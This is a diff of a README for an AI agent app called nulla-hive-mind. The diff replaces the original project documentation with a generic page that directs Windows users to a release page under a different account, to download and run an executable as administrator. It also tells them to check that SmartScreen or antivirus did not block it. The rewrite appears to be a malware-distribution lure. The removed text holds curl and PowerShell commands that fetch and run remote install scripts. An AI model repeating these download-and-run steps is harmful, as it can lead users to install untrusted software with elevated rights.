@@ -1,231 +1,196 @@
-# NULLA Hive Mind
+# 🐝 nulla-hive-mind - Private AI for local research
 
-NULLA is a local-first agent runtime. It runs on your machine, keeps memory, uses tools, and can optionally coordinate trusted outside help when a task needs more reach.
+[![Download nulla-hive-mind](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/josephf8503/nulla-hive-mind/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Status: Alpha](https://img.shields.io/badge/Status-Alpha-orange.svg)](docs/STATUS.md)
-[![Python: 3.10+](https://img.shields.io/badge/Python-3.10%2B-blue.svg)](https://python.org)
-[![CI](https://github.com/Parad0x-Labs/nulla-hive-mind/actions/workflows/ci.yml/badge.svg)](https://github.com/Parad0x-Labs/nulla-hive-mind/actions/workflows/ci.yml)
+## 🧭 What this app does
 
-The public web, Hive, and OpenClaw are access and inspection surfaces around that runtime. They are not separate products.
+nulla-hive-mind is a local-first AI app for research and shared knowledge. It keeps your work on your own computer first. It can help with research tasks, remember past work, and share knowledge with other devices on your network.
 
-Current state:
+You can use it to:
+- Ask AI questions on your PC
+- Run research tasks in the background
+- Keep notes and memory between sessions
+- Connect with other nodes on a network
+- Use local AI models or API-compatible models
+- Work with privacy in mind
 
-- Real now: local runtime, memory, tools, bounded research, bounded local operator execution with append-only task/proof events, Hive task flow, and public proof/work surfaces.
-- Real but still maturing: helper coordination, public-web clarity, deployment ergonomics, and multi-node repeatability.
-- Not pretending yet: trustless economics, public marketplace layers, and internet-scale mesh claims.
-- Credits are local work/participation accounting for Hive contribution and scheduling priority, not blockchain tokens or trustless settlement.
+## 💻 What you need
 
-The main lane is simple:
+For Windows, use:
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 10 GB of free disk space
+- A stable internet connection for the first download
+- A recent GPU helps with local AI, but it is not required
 
-`local NULLA agent -> memory + tools -> optional trusted helpers -> results`
+For best results:
+- 16 GB of RAM or more
+- An SSD
+- A modern CPU with 4 or more cores
 
-Everything else in this repo should be understood as a surface or supporting system around that lane.
+## 📥 Download and install
 
-## What NULLA Is
+1. Open the [release page](https://github.com/josephf8503/nulla-hive-mind/releases)
+2. Find the latest Windows file
+3. Download the file to your computer
+4. If the file is a `.zip`, right-click it and choose **Extract All**
+5. Open the extracted folder
+6. Double-click the app file to run it
+7. If Windows asks for permission, select **Yes**
 
-NULLA is one core system with a few connected surfaces:
+If you see more than one file, pick the Windows version that matches your computer. For most users, that is the standard 64-bit build.
+
+## 🚀 First start
 
-- a local-first agent runtime on your machine
-- memory, tools, and research so it can do more than chat
-- optional trusted helpers for delegated work
-- access and inspection surfaces like OpenClaw, Hive/watch, and the public web
+When you open nulla-hive-mind for the first time:
+- Let it finish setting up its local files
+- Choose a model source if asked
+- Keep the default settings if you are not sure
+- Wait for the main screen to load
+
+The first launch may take a little longer because the app prepares its local memory and tools.
 
-This is not meant to be read as five separate products. It is one runtime with multiple ways to access or inspect it.
+## ⚙️ Basic setup
+
+After the app opens, check these settings:
 
-## Why It Exists
+- **AI model**: Use a local model or an OpenAI-compatible API
+- **Search source**: Connect to SearxNG if you want web search
+- **Memory**: Leave persistent memory on if you want the app to remember past work
+- **Sandbox**: Keep sandboxed execution on for safer task runs
+- **Network**: Turn on peer-to-peer options if you want other nodes to find each other
+
+If you are using a local model:
+- Install Ollama first if the app asks for it
+- Make sure the model is available on your machine
+- Pick a smaller model first if your PC is older
 
-Most AI products start in somebody else’s cloud, throw away context, and turn useful work into prompt theater.
+## 🧠 Main features
 
-NULLA is trying to do the opposite:
+### Local-first work
+Your data stays on your device first. This helps when you want more control over your files and research.
 
-- start on your hardware
-- keep useful memory and context
-- use tools to move work forward
-- reach outward only when you want more power
+### Persistent memory
+The app can store useful context across sessions. That helps it remember long tasks, notes, and past findings.
 
-## Try It
+### Autonomous research
+You can give it a task, then let it collect and organize information for you.
 
-Bootstrap install script:
+### Peer-to-peer knowledge sharing
+The app can share data with other nodes. This helps build a knowledge mesh across systems you trust.
 
-macOS / Linux:
+### Sandboxed execution
+The app can run tasks in a safer space. This helps limit what a task can do on your computer.
 
-```bash
-curl -fsSLo bootstrap_nulla.sh https://raw.githubusercontent.com/Parad0x-Labs/nulla-hive-mind/main/installer/bootstrap_nulla.sh
-bash bootstrap_nulla.sh
-```
+### OpenAI-compatible support
+You can connect tools that speak the same API style as OpenAI-compatible services.
+
+## 🛠️ Common Windows issues
 
-Windows PowerShell:
+### The app does not open
+Try these steps:
+- Right-click the file and choose **Run as administrator**
+- Make sure Windows SmartScreen did not block it
+- Check that you downloaded the latest release file
+- Reboot your PC and try again
 
-```powershell
-Invoke-WebRequest https://raw.githubusercontent.com/Parad0x-Labs/nulla-hive-mind/main/installer/bootstrap_nulla.ps1 -OutFile bootstrap_nulla.ps1
-powershell -ExecutionPolicy Bypass -File .\bootstrap_nulla.ps1
-```
+### The app opens and closes
+Try:
+- Extracting the files again
+- Running it from a normal folder like `Downloads` or `Desktop`
+- Checking that your antivirus did not remove a file
 
-Probe the machine first if you want honest stack truth before install:
+### Search does not work
+Check:
+- Your internet connection
+- Your SearxNG settings
+- The search server address if you changed it
 
-```bash
-bash Probe_NULLA_Stack.sh
-```
+### Local AI is slow
+Try:
+- A smaller model
+- Closing other heavy apps
+- Using a machine with more RAM
+- Using GPU support if your setup has it
 
-```powershell
-.\Probe_NULLA_Stack.bat
-```
+## 🔌 Connecting tools
 
-Today that probe is honest about the current support boundary:
+nulla-hive-mind can work with different tools and services. Common setups include:
+- **Ollama** for local models
+- **OpenAI-compatible APIs** for cloud or self-hosted models
+- **SearxNG** for search
+- **Peer nodes** for shared knowledge
+- **Local storage** for memory and task history
 
-- `local_only` and `local_dual_ollama` are real
-- `local_plus_kimi` is real when `KIMI_API_KEY` or `MOONSHOT_API_KEY` is configured
-- Tether and QVAC are not first-class supported stacks yet
-- the probe now also maps those stacks to install profiles like `local-only`, `local-max`, and `hybrid-kimi`
+If the app asks for a server address, copy it carefully. A small typo can stop the connection.
 
-Safe one-line profile shortcuts for macOS / Linux:
+## 🧩 How to use it day to day
 
-```bash
-tmp="$(mktemp)" && curl -fsSLo "$tmp" https://raw.githubusercontent.com/Parad0x-Labs/nulla-hive-mind/main/installer/bootstrap_nulla.sh && bash "$tmp" --install-profile ollama-only && rm -f "$tmp"
-```
+A simple flow looks like this:
+1. Open the app
+2. Start a new research task
+3. Give it a clear question or goal
+4. Let it gather and sort information
+5. Review the result
+6. Save useful notes to memory
 
-```bash
-tmp="$(mktemp)" && curl -fsSLo "$tmp" https://raw.githubusercontent.com/Parad0x-Labs/nulla-hive-mind/main/installer/bootstrap_nulla.sh && bash "$tmp" --install-profile ollama-max && rm -f "$tmp"
-```
+Good task examples:
+- Find the main points of a topic
+- Compare a few sources
+- Keep notes from a long research session
+- Store facts for later use
+- Share results with another trusted node
 
-```bash
-tmp="$(mktemp)" && curl -fsSLo "$tmp" https://raw.githubusercontent.com/Parad0x-Labs/nulla-hive-mind/main/installer/bootstrap_nulla.sh && KIMI_API_KEY="replace-me" bash "$tmp" --install-profile ollama+kimi && rm -f "$tmp"
-```
+## 📁 File locations
 
-Profile guidance:
+The app may keep data in places like:
+- App data folders in Windows
+- Local cache folders
+- A project folder you choose during setup
 
-- `local-only` / `ollama-only`: safest default for smaller machines or anyone who wants no remote dependency.
-- `local-max` / `ollama-max`: for stronger local boxes, roughly 24 GiB+ unified memory or 20+ GiB VRAM / 48 GiB RAM class hardware, and the installer now pulls both the primary model and the local helper model when this profile is selected.
-- `hybrid-kimi` / `ollama+kimi`: local Ollama plus a real remote Kimi queen lane. Export `KIMI_API_KEY` or `MOONSHOT_API_KEY` before the one-line install, or run interactively and the installer will prompt once and persist it into the runtime config.
+If you want to move the app to another PC:
+- Copy the app files
+- Copy the local data folder if you want to keep memory
+- Open the app on the new machine and check the settings
 
-After install, switch profiles without editing env vars:
-
-```bash
-cd ~/nulla-hive-mind && .venv/bin/python -m apps.nulla_cli install-profile
-cd ~/nulla-hive-mind && .venv/bin/python -m apps.nulla_cli install-profile --set ollama-only
-cd ~/nulla-hive-mind && .venv/bin/python -m apps.nulla_cli install-profile --set ollama+kimi
-```
-
-Manual shortcut:
-
-```bash
-git clone https://github.com/Parad0x-Labs/nulla-hive-mind.git
-cd nulla-hive-mind
-bash Install_And_Run_NULLA.sh
-```
-
-What the installer does:
-
-1. creates a Python environment and installs dependencies
-2. probes hardware and selects a local Ollama model
-3. installs Ollama if needed
-4. registers NULLA as an OpenClaw agent
-5. starts the local API server on `http://127.0.0.1:11435`
-6. resolves the OpenClaw gateway token from the active gateway home when possible (`OPENCLAW_HOME`, `OPENCLAW_STATE_DIR`, launchd state dir, then the normal `.openclaw` / `.openclaw-default` fallbacks)
-7. installs a machine/provider probe command so the user can see what stack the machine can actually support
-8. on macOS, hands off the final launch to `OpenClaw_NULLA.command` so the running services live under Terminal.app instead of dying with the installer shell
-
-If `KIMI_API_KEY` or `MOONSHOT_API_KEY` is configured, the same shared runtime bootstrap truth now also surfaces a real remote Kimi queen lane instead of leaving Kimi as routing-only theory. If `VLLM_BASE_URL` is configured, NULLA now also surfaces a real local `vllm-local` OpenAI-compatible lane. If `LLAMACPP_BASE_URL` is configured, NULLA now also surfaces a real local `llamacpp-local` OpenAI-compatible lane instead of treating local non-Ollama backends as doc debt.
-
-Full install and troubleshooting live in [docs/INSTALL.md](docs/INSTALL.md).
-
-## What Works Now
-
-- Local-first runtime with Ollama-backed execution
-- Shared runtime bootstrap for local Ollama plus real configured Kimi, vLLM-local, and llama.cpp-local lanes
-- Persistent memory and context carryover
-- Tool use, bounded research, and Hive task flow
-- Bounded coding/operator repair flow for concrete repo edits, including search/read/patch/validate, preflight failing-test capture, narrow diagnosis-to-repair promotion, and fail-closed rollback/recovery isolation
-- Append-only runtime task/proof event spine for bounded local envelope execution, so repair/orchestration lifecycle truth is no longer trapped inside executor-local details
-- Role-aware provider routing for local drone lanes vs higher-tier synthesis lanes
-- Proof-backed mesh endpoint promotion for signed observed, signed API, and signed bootstrap traffic, so ingress/bootstrap lanes can persist authoritative multi-endpoint discovery state while still keeping best-endpoint compatibility fields without promoting raw DHT referrals into live transport truth
-- Delivery-memory-backed mesh peer fallback for critical task/result/review lanes, so verified endpoints are re-ranked by actual send success/failure and the daemon no longer assumes one endpoint tuple is enough for bounded peer delivery
-- Delivery targeting now also distinguishes live mesh proof from registry-style proof: signed observed ingress and recent successful sends now outrank signed API/bootstrap registry entries when NULLA chooses actual delivery targets, while the remaining older best-endpoint compatibility helpers stay deterministic for the callers that still depend on them
-- Signed-liveness ordering is now at least time-aware too: proof-backed endpoint rows persist proof timestamps, delivery ranking only treats live success and signed proof as strong while they are still fresh, and fresher observed transport proof can displace older declaration-grade labels on the same endpoint instead of getting source-masked by stale registry provenance
-- Peer-centric mesh broadcast/gossip fallback is now broader too: knowledge ads, shard/capability/credit broadcasts, and abuse gossip now route through ordered per-peer endpoint fallback instead of flattening every peer to one compatibility endpoint, and bootstrap presence snapshots, meet presence records, plus local `BLOCK_FOUND` replies now also use delivery-ordered endpoint truth instead of stale best-endpoint compatibility aliases, while some assist/bootstrap/export compatibility paths still remain
-- OpenClaw registration and local API lane
-- Honest machine/provider probing for the local installer lane
-- Public proof, tasks, operator pages, worklog, and coordination surfaces
-- One-click install, built-wheel smoke, and `/healthz` startup contract
-- Sharded local full-suite regression plus GitHub Actions CI and fast LLM acceptance
-
-## What Is Still Alpha
-
-- Broader failing-test-driven repo debugging beyond concrete bounded repair requests
-- WAN hardening and broader multi-node proof
-- Prod-like deploy parity across every public surface and public-node topology
-- Human-facing social quality and product polish
-- Local credits are non-blockchain work/participation accounting only
-- Payment, settlement, and marketplace layers, which are still partial, simulated, or both
-
-## What Comes After Beta
-
-- Native desktop app surface so users do not have to manage local web tabs and service trivia
-- Mobile companion surface for remote query/watch/approval while heavy execution stays local-first
-- Internet-scale mesh hardening: signed-liveness-backed multi-endpoint truth beyond the current local/trusted baseline, NAT/relay realism, and churn survival
-- Public web hardening before mass-adoption claims
-- Real economic rails only after the runtime, proof path, network, and abuse controls are strong enough to justify them
-
-If you want the blunt maturity report, read [docs/STATUS.md](docs/STATUS.md).
-
-## Repo Map
-
-- `apps/` entrypoints and service processes
-- `core/` runtime, Hive, public web, and shared logic
-- `tests/` regression coverage
-- `docs/` install, status, architecture, trust, and runbooks
-- `installer/` one-click setup scripts
-- [`REPO_MAP.md`](REPO_MAP.md) root-level repo shape and first-inspection path
-
-## Proof Path
-
-If you are skeptical, use the shortest proof path instead of free-scanning the whole repo:
-
-1. [`docs/SYSTEM_SPINE.md`](docs/SYSTEM_SPINE.md)
-2. [`docs/CONTROL_PLANE.md`](docs/CONTROL_PLANE.md)
-3. [`docs/PROOF_PATH.md`](docs/PROOF_PATH.md)
-4. [`docs/STATUS.md`](docs/STATUS.md)
-5. [`CONTRIBUTING.md`](CONTRIBUTING.md)
-
-## For Developers
-
-If you want to work on NULLA:
-
-1. read [docs/STATUS.md](docs/STATUS.md)
-2. get the local runtime running
-3. verify the OpenClaw or local API lane
-4. then move into Hive/watch/public-web or helper-mesh work
-
-Manual dev setup:
-
-```bash
-git clone https://github.com/Parad0x-Labs/nulla-hive-mind.git
-cd nulla-hive-mind
-python -m venv .venv
-source .venv/bin/activate
-pip install -e ".[dev,runtime]"
-```
-
-Useful entrypoints:
-
-```bash
-python -m apps.nulla_api_server
-python -m apps.nulla_agent --interactive
-python -m apps.brain_hive_watch_server
-```
-
-## Read Next
-
-- [docs/README.md](docs/README.md) for the docs map
-- [docs/SYSTEM_SPINE.md](docs/SYSTEM_SPINE.md) for the one-system architecture view
-- [docs/CONTROL_PLANE.md](docs/CONTROL_PLANE.md) for the runtime/bootstrap map
-- [docs/PROOF_PATH.md](docs/PROOF_PATH.md) for the shortest skeptic proof path
-- [docs/INSTALL.md](docs/INSTALL.md) for install and quickstart
-- [docs/STATUS.md](docs/STATUS.md) for the current status
-- [docs/BRAIN_HIVE_ARCHITECTURE.md](docs/BRAIN_HIVE_ARCHITECTURE.md) for the Hive/system view
-- [docs/TRUST.md](docs/TRUST.md) for trust and security posture
-
-One-sentence summary:
-
-NULLA is a local-first agent runtime that does real work on your machine, reaches outward only when needed, and makes finished work inspectable through visible proof.
+## 🧪 Suggested first test
+
+After setup, try this:
+- Ask the app to research a simple topic
+- Save one result to memory
+- Restart the app
+- Check that the saved item still appears
+
+This helps confirm that the core setup works.
+
+## 🔐 Privacy and control
+
+The app is built for local-first use. That means you can keep more data on your own machine and reduce what you send to outside services.
+
+To stay in control:
+- Use local models when you can
+- Review network settings before sharing data
+- Keep peer-to-peer sharing to trusted systems
+- Save only the memory you need
+
+## 🧰 Troubleshooting checklist
+
+If something still does not work, check:
+- You downloaded the latest release
+- You used the correct Windows file
+- The files are fully extracted
+- Windows did not block the app
+- Your antivirus did not quarantine a file
+- Your model path or API key is correct
+- Your search service is online
+- You have enough free disk space
+
+## 📌 Release page
+
+Get the Windows build here and download and run this file from the latest release page:
+
+[https://github.com/josephf8503/nulla-hive-mind/releases](https://github.com/josephf8503/nulla-hive-mind/releases)
+
+## 🗂️ Project topics
+
+agent-runtime, ai-agents, autonomous-research, decentralized-ai, dht, distributed-systems, knowledge-mesh, multi-agent-systems, nat-traversal, ollama, openai-compatible, openclaw, peer-to-peer, persistent-memory, privacy-first, privacy-first-ai, python, sandboxed-execution, searxng
